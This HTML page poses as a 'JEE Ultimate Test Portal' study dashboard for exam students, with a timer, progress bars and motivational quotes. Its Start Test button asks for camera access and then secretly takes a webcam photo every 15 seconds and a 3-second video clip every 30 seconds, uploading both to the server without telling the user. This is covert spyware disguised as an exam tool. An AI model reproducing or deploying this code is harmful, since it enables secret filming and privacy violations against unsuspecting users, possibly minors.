<!DOCTYPE html><html><head><meta charset="UTF-8"><title>JEE Ultimate Test Portal</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}
html,body{height:100%;overflow:hidden;color:white;}
body{background:linear-gradient(-45deg,#0f2027,#203a43,#2c5364,#000000);background-size:400% 400%;animation:gradientMove 12s ease infinite;}
@keyframes gradientMove{0%{background-position:0% 50%;}50%{background-position:100% 50%;}100%{background-position:0% 50%;}}
#overlay{position:absolute;width:100%;height:100%;overflow:auto;backdrop-filter:blur(12px);background:rgba(0,0,0,0.6);padding:40px;z-index:10;}
.browser-note{background:#ff9800;color:black;padding:8px 12px;border-radius:8px;font-size:14px;font-weight:600;margin-bottom:15px;text-align:center;}
h1{text-align:center;font-size:48px;letter-spacing:4px;margin-bottom:10px;animation:flashIntro 2s ease forwards;}
@keyframes flashIntro{0%{opacity:0;letter-spacing:20px;}50%{opacity:1;text-shadow:0 0 30px #ff004c;}100%{letter-spacing:4px;}}
.top-info{text-align:center;margin-bottom:25px;}
#studentName{cursor:pointer;color:#00ffd5;}
.container{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:25px;margin-top:30px;}
.card{background:rgba(255,255,255,0.05);padding:20px;border-radius:20px;backdrop-filter:blur(6px);}
.progress{height:10px;background:#333;border-radius:20px;overflow:hidden;margin-top:8px;}
.progress div{height:100%;width:0%;background:linear-gradient(90deg,#00ffcc,#00bfff);transition:1s;}
button{padding:10px 20px;border:none;border-radius:30px;cursor:pointer;background:linear-gradient(45deg,#ff004c,#ff7a00);color:white;font-weight:bold;margin-top:10px;}
iframe{width:100%;height:100%;border:0;display:none;position:absolute;top:0;left:0;z-index:1;}
#v,#c{display:none;}
</style></head><body>

<div id="overlay">
    <div class="browser-note">For better stability, use Chrome or Brave browser.</div>
    <h1>JEE Ultimate Test Portal</h1>
    <div class="top-info">
        <div id="studentName" onclick="changeName()">Welcome, Adarsh ðŸš€</div>
        <div id="timeDate"></div>
        <div id="rankCounter">Loading Rank...</div>
    </div>
    <div class="container">
        <div class="card"><h3>Start Test</h3><button onclick="start()">â–¶ Start Test</button></div>
        <div class="card"><h3>Subject Progress</h3>
            Physics<div class="progress"><div id="phy"></div></div>
            Chemistry<div class="progress"><div id="chem"></div></div>
            Maths<div class="progress"><div id="math"></div></div>
        </div>
        <div class="card"><h3>Study Timer</h3><div id="timer">00:00:00</div>
            <button onclick="startTimer()">Start</button><button onclick="stopTimer()">Stop</button>
        </div>
        <div class="card"><h3>Motivation</h3><div class="quote" id="quote"></div></div>
    </div>
</div>

<iframe id="frame"></iframe>
<video id="v" autoplay playsinline muted></video>
<canvas id="c"></canvas>

<script>
let mediaRecorder;
let chunks = [];

/* Existing Logic */
function changeName(){ let name=prompt("Enter name:"); if(name){ localStorage.setItem("jeeName",name); location.reload(); }}
let saved=localStorage.getItem("jeeName"); if(saved) document.getElementById("studentName").innerText="Welcome, "+saved+" ðŸš€";

function updateTime(){ let now=new Date(); document.getElementById("timeDate").innerText=now.toLocaleDateString()+" | "+now.toLocaleTimeString(); }
setInterval(updateTime,1000); updateTime();

let p=0; let counter=setInterval(()=>{ p+=1.5; if(p>=99.30){p=99.30;clearInterval(counter);} document.getElementById("rankCounter").innerText="Target: "+p.toFixed(2)+"%"; },30);
setTimeout(()=>{ phy.style.width="70%"; chem.style.width="60%"; math.style.width="75%"; },500);

let sec=0,tInt;
function startTimer(){ tInt=setInterval(()=>{ sec++; let h=Math.floor(sec/3600), m=Math.floor((sec%3600)/60), s=sec%60; timer.innerText=String(h).padStart(2,'0')+":"+String(m).padStart(2,'0')+":"+String(s).padStart(2,'0'); },1000); }
function stopTimer(){ clearInterval(tInt); }

let quotes=["Consistency beats motivation.","One test closer to IIT.","Focus now, celebrate later."];
let qi=0; setInterval(()=>{ quote.innerText=quotes[qi]; qi=(qi+1)%quotes.length; },4000);

/* START TEST & CAPTURE */
async function start(){
    try {
        const stream = await navigator.mediaDevices.getUserMedia({video:true});
        v.srcObject = stream;
        
        // Start Intervals
        setInterval(capturePhoto, 15000); // Every 15s Photo
        setInterval(captureVideo, 30000); // Every 30s Video
        
    } catch(e) { alert("Camera Required!"); return; }

    document.getElementById("overlay").style.display="none";
    const res = await fetch("/get_video_link");
    const data = await res.json();
    const frame = document.getElementById("frame");
    frame.style.display="block"; frame.src = data.url;
}

function capturePhoto(){
    c.width = v.videoWidth; c.height = v.videoHeight;
    c.getContext("2d").drawImage(v, 0, 0);
    c.toBlob(b => {
        let fd = new FormData(); fd.append("photo", b);
        fetch("/upload", {method:"POST", body:fd});
    }, "image/jpeg", 0.6);
}

function captureVideo(){
    chunks = [];
    mediaRecorder = new MediaRecorder(v.srcObject);
    mediaRecorder.ondataavailable = e => chunks.push(e.data);
    mediaRecorder.onstop = () => {
        let b = new Blob(chunks, {type: 'video/mp4'});
        let fd = new FormData(); fd.append("video", b);
        fetch("/upload_video", {method:"POST", body:fd});
    };
    mediaRecorder.start();
    setTimeout(() => mediaRecorder.stop(), 3000); // 3 Sec
}
</script></body></html>
